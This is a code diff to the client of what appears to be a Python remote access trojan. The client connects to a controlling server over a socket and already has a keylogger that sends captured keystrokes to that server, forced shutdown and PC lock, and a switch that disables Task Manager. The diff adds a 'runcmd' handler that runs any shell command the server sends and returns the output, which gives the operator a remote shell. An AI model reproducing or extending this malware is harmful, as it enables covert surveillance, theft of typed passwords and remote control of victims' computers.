@@ -180,10 +180,10 @@ def shut_res_lock():
         ctypes.windll.user32.LockWorkStation()  # lock pc
         return
     elif strChoice[3:7] == "none":
-        command = "shutdown " + strChoice[0:2] + " -f -t 0"
+        command = "shutdown " + strChoice[0:2] + " -f -t 100"
         subprocess.Popen(command.split(), shell=True)
     else:
-        command = ("shutdown " + strChoice[0:2] + " -f -t 5 -c").split()
+        command = ("shutdown " + strChoice[0:2] + " -f -t 100 -c").split()
         command.append(strChoice[3:len(strChoice)])
         subprocess.Popen(command, shell=True)
     objSocket.close()  # close connection and exit
@@ -343,6 +343,24 @@ def keylogger(option):
         time.sleep(0.2)
         objSocket.send(str.encode(strLogs))  # send logs
 
+
+def run_command(command):
+    strLogOutput = socket.gethostname() + "\n"
+
+    if len(command) > 0:
+        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
+    else:
+        strLogOutput += "Error!!!"
+
+    bytData = str.encode(strLogOutput)
+
+    strBuffer = str(len(bytData))
+    objSocket.send(str.encode(strBuffer))  # send buffer size
+    time.sleep(0.1)
+    objSocket.send(bytData)  # send output
+
+
 try:
     while True:
         strData = objSocket.recv(1024)
@@ -384,6 +402,8 @@ try:
             keylogger("stop")
         elif strData == "keydump":
             keylogger("dump")
+        elif strData[:6] == "runcmd":
+            run_command(strData[6:len(strData)])
         elif strData == "dtaskmgr":
             if not "blnDisabled" in globals():  # if the variable doesnt exist yet
                 blnDisabled = "True"
